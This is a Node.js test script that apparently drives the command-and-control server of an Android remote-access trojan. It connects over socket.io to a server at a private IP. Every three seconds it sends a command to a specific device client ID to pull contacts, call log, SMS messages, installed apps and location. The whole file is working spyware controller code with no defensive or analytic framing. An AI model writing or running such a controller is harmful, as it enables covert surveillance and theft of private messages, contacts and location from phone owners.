const io = require('socket.io-client');

// Connect to server
const socket = io('http://192.168.1.101:9400');

socket.on('connect', () => {
    console.log('✅ Connected to server');
    
    // Wait a bit then send test commands
    setTimeout(() => {
        console.log('📤 Testing commands...');
        
        // Test different commands
        const commands = [
            { type: '0xCO', name: 'Contacts' },
            { type: '0xCL', name: 'Call Log' },
            { type: '0xSM', name: 'SMS' },
            { type: '0xIN', name: 'Installed Apps' },
            { type: '0xLO', name: 'Location' }
        ];
        
        let commandIndex = 0;
        
        const sendNextCommand = () => {
            if (commandIndex < commands.length) {
                const cmd = commands[commandIndex];
                console.log(`📤 Sending ${cmd.name} command (${cmd.type})...`);
                
                socket.emit('send_command', {
                    clientID: 'android_1758306345283_994', // Use the client ID from logs
                    command: {
                        type: cmd.type,
                        uid: 'test_' + Date.now() + '_' + commandIndex
                    }
                });
                
                commandIndex++;
                setTimeout(sendNextCommand, 3000); // Wait 3 seconds between commands
            } else {
                console.log('✅ All commands sent successfully');
            }
        };
        
        sendNextCommand();
    }, 2000);
});

socket.on('disconnect', () => {
    console.log('❌ Disconnected from server');
});

socket.on('error', (error) => {
    console.error('❌ Socket error:', error);
});

// Keep alive
setInterval(() => {
    if (socket.connected) {
        console.log('💓 Connection alive');
    } else {
        console.log('💔 Connection lost');
    }
}, 10000);
